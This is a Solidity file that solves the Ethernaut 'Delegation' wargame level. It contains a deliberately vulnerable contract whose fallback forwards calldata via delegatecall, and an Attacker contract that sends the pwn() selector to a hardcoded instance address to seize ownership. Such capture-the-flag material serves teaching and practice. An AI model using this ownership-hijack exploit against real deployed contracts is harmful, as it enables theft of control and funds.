// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {
  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {
  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result, ) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Attacker {
  address public delegation = 0x96b7b8a6e1add094D4BE0cb8ab269abEb2b1A64f; // ethernaut vulnerable contract

  function getPwn() public pure returns (bytes memory) {
    bytes4 selector = bytes4(keccak256(bytes("pwn()")));
    return abi.encodeWithSelector(selector);
  }

  function attack() public returns (bool) {
    bytes memory pwn = getPwn();
    (bool success, ) = delegation.call(pwn);
    return success;
  }
}